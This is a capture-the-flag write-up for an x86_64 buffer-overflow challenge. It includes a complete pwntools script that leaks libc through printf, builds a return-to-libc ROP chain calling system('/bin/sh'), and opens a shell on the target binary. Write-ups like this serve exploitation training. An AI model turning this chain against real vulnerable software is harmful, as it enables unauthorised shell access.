---
title: "Liberate your Library"
layout: page
---

- Exploitation
- Buffer Overflow
- C
- X86_64
- Medium

Writeup by `Sasszem`

# Description and resources
## Mission brief
Exploit an ELF binary and read the flag from a file.

## Instructions
You are getting more and more enthusiastic and start feeling the vibe of a real job. Yes, you are good at breaking things. So here is the thing. There is a simple binary in your `src` directory that is armoured with certain recent hardening techniques such as the NX bit, ASLR or RELRO. Fortunately, you already heard about ROP and Return-to-LibC.

- We prepared a fully armoured environment to succeed - with this challenge, so we installed your favourite - tools:
- GDB with PEDA
- Checksec
- Pwntools for python3
- ROPgadget
- vim/nano

Your next target is called `main` and your job is to exploit it to get access to the file `/flag`. Enjoy the ride and have fun.

(a few things were links but I did not bother to copy since they were to 1st hits on google)

---

# Writeup

Now this one was significantly harder than the 1st part, but not that hard overall.

The supplied binary starts by telling me it's `printf`'s address. Hmkay than, I `scp`d the `libc` from the server and also had a `libc` address. Might come handy later.

The program then continues with reading in input, then printing it back. It's double hell, since it both uses `gets` to read and `printf` to print, but I only used the `gets` vulnerability.

Basically we have a classic buffer overflow, no canary, no ASLR, only NX bit. ROP works pretty well, and I used this opportunity to try out `pwnlib`'s ROP module. I did not use it in the intended way, but still worked out.

The code I made with ROP only sets up the parameters (`/bin/bash`) and calls the libc `system` function so I can get a shell. Nothing too fancy.

```python
from pwn import *

#p = process('./main')
LOCAL = True

# GDB helps to debug locally
p = gdb.debug('./main', '''b *vuln+0x2c''') if LOCAL else process('./main')


binary = ELF('./main')
context.binary = binary
libc = ELF('./libc.so.6.local') if LOCAL else ELF('/lib/x86_64-linux-gnu/libc.so.6')


# leak libc address - it's free as it's printed
p.recvline()
printf_addr = eval(p.recvline())
print(f"Printf: 0x{libc.symbols['printf']:x}")
libc_base = printf_addr - libc.symbols["printf"]
print(f"{libc_base=:x}")


# We have a simple overflow, so a simple ROP attack is all that needed

# single ret to fix the stack laignment
ret_addr = libc_base + next(libc.search(b"\xc3"))

# pop rdi and bp
# found using ropper
# (different on local vs remote bc I have a differnet libc locally)
# bp popping is not necessary, but this was one of the best gadgets for rdi, and popping 2 values also works out for aligning the stack
poprdirbp = libc_base + (0x276e9 if LOCAL else 0x2456d)

# address of "/bin/sh\0" (from libc)
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))

# address of system function
system_addr = libc_base + libc.symbols["system"]

libc.address = libc_base



# build that rop chain

rop = ROP(binary)
rop.raw(b"A"*64) # filler
rop.raw(b"B"*8) # RBP - not needed so overwritten w/ junk

#rop.raw(ret_addr) # not needed, used for stack aligning but double pop does that too

# set rdi="/bin/sh" (1st param of system)
rop.raw(poprdirbp) # also auto-aligns the stack :P
rop.raw(binsh) # RDI -> binsh (1st param)
rop.raw(b"AAAAAAAA") # filler for rbp

# system it
rop.raw(system_addr) #, [binsh])


# see what I have done
print(rop.dump())


p.sendline(rop.chain())
print(p.clean())
p.interactive()
```

Only real problem was the unaligned stack but a bit of googling solved that all. Debugging shellcode is never easy however, and it took me some time to get it to work. Also for some reason the `ROP` class did not want to work on the server, so I had to change that part a bit later.